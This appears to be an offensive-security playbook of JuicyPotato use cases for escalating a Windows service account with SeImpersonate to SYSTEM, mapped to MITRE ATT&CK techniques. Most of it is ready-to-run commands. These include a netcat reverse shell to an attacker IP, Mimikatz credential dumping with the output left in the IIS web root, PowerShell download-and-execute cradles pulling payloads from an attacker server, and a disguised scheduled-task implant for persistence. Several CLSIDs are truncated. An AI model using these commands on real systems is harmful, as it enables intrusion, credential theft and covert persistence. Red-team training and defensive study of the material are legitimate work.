# JuicyPotato — Hands-On Use Cases

## Basic SYSTEM command execution with default CLSID

**MITRE ATT&CK:** T1134.003 (Access Token Manipulation), T1548.002 (Abuse Elevation Control Mechanism)

**Scenario:** You have shell access as a service account with `SeImpersonate` privilege. You run JuicyPotato with default settings to escalate to SYSTEM.

```bash
JuicyPotato.exe -l 10000 -p "cmd.exe" -a "whoami > C:\Windows\Temp\whoami.txt"
```

**Step-by-step:**
1. JuicyPotato launches and listens on port 10000 for COM instantiation.
2. It tries a default CLSID (typically BITS or a Windows 10 service).
3. If successful, a SYSTEM-context `cmd.exe` spawns and executes `whoami > C:\Windows\Temp\whoami.txt`.
4. Check the output file to verify SYSTEM access.

**Operator notes:**
- The command string must be passed as a single argument to `-p`; complex commands should use quotes.
- Without `-a`, the program (`cmd.exe`) still spawns but does nothing.
- No output is visible unless redirected to a file (same as PrintSpoofer).

---

## Testing CLSID compatibility before exploit

**MITRE ATT&CK:** T1087 (Account Discovery — enumeration, not exploitation)

**Scenario:** You want to check if a specific CLSID works on the target system before running the full exploit.

```bash
JuicyPotato.exe -l 10000 -z -c "{5E9DDC73-7E6D-4DA9-92BA-B23270F19C09}"
```

(This CLSID is the BITS service, which works on many Windows versions.)

**Step-by-step:**
1. JuicyPotato binds to port 10000 and attempts to instantiate the specified CLSID.
2. If successful, it prints `[+] CLSID: {5E9DDC73-...} is usable` and exits.
3. If it fails, it exits with an error (CLSID not available on this system).

**Operator notes:**
- The `-z` flag is **test mode only** — it does not execute any payload.
- Use this to identify a working CLSID before committing to the full exploit.
- A CLSID that works in test mode will likely work in the full exploit.

---

## Reverse shell escalation (netcat)

**MITRE ATT&CK:** T1548.002, T1190

**Scenario:** You have IIS RCE as the app pool identity (has SeImpersonate). You want a SYSTEM-context reverse shell.

**Step 1: Upload nc.exe (netcat) to the target**

(Assume you've already done this via your initial RCE shell or SMB upload.)

**Step 2: Set up your attacker listener**

```bash
# On your attacker machine:
nc -lvnp 4444
```

**Step 3: Exploit with JuicyPotato**

```bash
JuicyPotato.exe -l 10000 -p "C:\Windows\Temp\nc.exe" -a "-e cmd.exe 10.10.10.10 4444"
```

**Step-by-step:**
1. JuicyPotato escalates to SYSTEM.
2. Spawns `nc.exe` as SYSTEM with args `-e cmd.exe 10.10.10.10 4444`.
3. Netcat spawns `cmd.exe` and connects it back to your listener.
4. You get a SYSTEM-context reverse shell on your attacker machine.

**Operator notes:**
- Ensure `nc.exe` exists at `C:\Windows\Temp\nc.exe` before running the exploit.
- The netcat listener must be reachable by the target machine.
- This is a **staged** escalation: first RCE as app pool, then escalation to SYSTEM via JuicyPotato.

---

## CLSID enumeration and brute-force (operator workflow)

**MITRE ATT&CK:** T1087 (Account Discovery / Enumeration)

**Scenario:** The default CLSID doesn't work on your target. You need to find a usable CLSID.

**Option 1: Use JuicyPotato's `-c` flag to try multiple CLSIDs**

```bash
# Try CLSID for Windows 7 BITS:
JuicyPotato.exe -l 10000 -p "cmd.exe" -c "{5E9DDC73-7E6D-4DA9-92BA-B23270F19C09}" -a "whoami > C:\tmp.txt"

# If that fails, try Windows 10 OneSyncSvc:
JuicyPotato.exe -l 10000 -p "cmd.exe" -c "{0FB0F995-...}" -a "whoami > C:\tmp.txt"
```

**Option 2: Automate via PowerShell**

```powershell
# Script to try multiple CLSIDs and report which works
$clsids = @(
    "{5E9DDC73-7E6D-4DA9-92BA-B23270F19C09}",  # BITS
    "{0FB0F995-...}",                           # OneSyncSvc
    "{14B59933-...}"                            # NtmsSvc
    # Add more as needed
)

foreach ($clsid in $clsids) {
    Write-Host "[*] Testing CLSID: $clsid"
    & "C:\Windows\Temp\JuicyPotato.exe" -l 10000 -z -c $clsid
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] CLSID $clsid is usable! Use: -c $clsid"
    }
}
```

**Operator notes:**
- Different Windows versions have different usable CLSIDs.
- Trial-and-error is normal; record successful CLSIDs for future reference.
- Some CLSIDs may require specific privilege levels or service accounts to be running.

---

## Credential dumping as SYSTEM

**MITRE ATT&CK:** T1003.001 (LSASS Memory), T1003.004 (LSA Secrets)

**Scenario:** Escalate to SYSTEM, then dump credentials.

```bash
JuicyPotato.exe -l 10000 -p "C:\Windows\Temp\mimikatz.exe" -a "sekurlsa::logonpasswords"
```

But output is lost without redirection. Use a wrapper:

```bash
JuicyPotato.exe -l 10000 -p "cmd.exe" -a "/c C:\Windows\Temp\mimikatz.exe sekurlsa::logonpasswords > C:\Windows\Temp\creds.txt"
```

**Operator notes:**
- Mimikatz as SYSTEM is the standard workflow for credential access.
- Ensure `mimikatz.exe` is pre-staged on the target.
- Redirect output to a file you can retrieve later.

---

## Multi-method token impersonation (auto-try)

**MITRE ATT&CK:** T1134.003

**Scenario:** You're unsure whether `SeImpersonate` or `SeAssignPrimaryToken` is available. Use `-t *` to auto-try.

```bash
JuicyPotato.exe -l 10000 -p "cmd.exe" -t * -a "whoami > C:\output.txt"
```

The `-t *` flag tells JuicyPotato to try both token methods (`CreateProcessWithTokenW` first, then `CreateProcessAsUser`) and use whichever works.

**Operator notes:**
- This is the safest approach if you're unsure about available privileges.
- Default is already `-t *` if omitted.

---

## IIS app pool escalation workflow

**MITRE ATT&CK:** T1548.002, T1190

**Scenario:** Classic IIS compromise: you have RCE as the IIS app pool (`IIS APPPOOL\DefaultAppPool`), which has `SeImpersonate`. Escalate and dump credentials.

**Step 1: From IIS shell, upload JuicyPotato and Mimikatz**

```cmd
# (Assume PowerShell or cmd shell already running as IIS app pool)
powershell -Command "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8080/upload.ps1')"
# This downloads and runs a script to upload JuicyPotato.exe and mimikatz.exe to C:\Windows\Temp\
```

**Step 2: Check privileges**

```cmd
whoami /priv
# Confirm SeImpersonate is present
```

**Step 3: Escalate with JuicyPotato**

```cmd
C:\Windows\Temp\JuicyPotato.exe -l 10000 -p "C:\Windows\Temp\mimikatz.exe" -a "sekurlsa::logonpasswords" > C:\inetpub\wwwroot\output.txt
```

**Step 4: Retrieve credentials**

```bash
# From attacker machine:
curl http://target/output.txt
```

**Operator notes:**
- IIS app pools typically have `SeImpersonate` by default.
- Storing output in the IIS web root (`C:\inetpub\wwwroot\`) makes it web-accessible for retrieval.
- Consider the noise: writing to the web root is logged in IIS.

---

## Windows 7 / Server 2008 R2 targeting (older systems)

**MITRE ATT&CK:** T1548.002

**Scenario:** You're targeting an older Windows system (Windows 7 or Server 2008 R2) where newer tools (PrintSpoofer, RoguePotato) may not work.

JuicyPotato is more reliable on these systems. Use a CLSID known to work on Windows 7:

```bash
JuicyPotato.exe -l 10000 -p "cmd.exe" -c "{5E9DDC73-7E6D-4DA9-92BA-B23270F19C09}" -a "whoami > C:\output.txt"
```

(The BITS CLSID `{5E9DDC73-...}` works on Windows 7+.)

**Operator notes:**
- JuicyPotato was designed with legacy systems in mind.
- If PrintSpoofer or RoguePotato fail on an older target, try JuicyPotato.
- Test CLSID compatibility first with `-z`.

---

## Persistence via scheduled task (post-escalation)

**MITRE ATT&CK:** T1053.005 (Scheduled Task/Job), T1547.014 (Registry Run Keys)

**Scenario:** Escalate to SYSTEM, then create a persistence mechanism.

```bash
JuicyPotato.exe -l 10000 -p "cmd.exe" -a "/c schtasks /create /tn \"WindowsUpdate\" /tr \"C:\Windows\Temp\implant.exe\" /sc onboot /ru system"
```

This creates a scheduled task that runs at boot as SYSTEM.

**Operator notes:**
- Persistence requires SYSTEM privilege; JuicyPotato is the bridge to that.
- The scheduled task name (`WindowsUpdate`) should blend in with legitimate Windows tasks.
- After creation, the task survives reboot and maintains attacker access.

---

## PowerShell fileless payload delivery

**MITRE ATT&CK:** T1059.001 (PowerShell), T1548.002

**Scenario:** You want to avoid dropping a binary and instead execute an in-memory PowerShell payload as SYSTEM.

```bash
JuicyPotato.exe -l 10000 -p "powershell.exe" -a "-NoProfile -ExecutionPolicy Bypass -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8080/implant.ps1')\""
```

This launches PowerShell as SYSTEM and downloads/executes a C2 payload in-memory.

**Operator notes:**
- The `-a` argument must have properly escaped quotes.
- This is "fileless" in the sense that the payload doesn't land on disk (only in memory).
- Ensure your C2 server is reachable from the target.

---

## Port conflict resolution (using alternative ports)

**Scenario:** Port 10000 (default) is already in use. Use a different port.

```bash
JuicyPotato.exe -l 9999 -p "cmd.exe" -a "whoami > C:\output.txt"
```

**Operator notes:**
- Any unused local port can be used with `-l`.
- The port doesn't need to be well-known; it's only for local COM communication.
- If you get a "port already in use" error, try a different port.

---

## Summary

JuicyPotato's workflow is **CLSID-dependent and requires trial-and-error**, unlike PrintSpoofer's simpler one-liner. However, its flexibility (multiple token methods, per-OS CLSID tuning) makes it valuable on legacy systems or when the default approach fails. The `-z` test mode is critical for operators—always validate a CLSID before launching the full exploit.
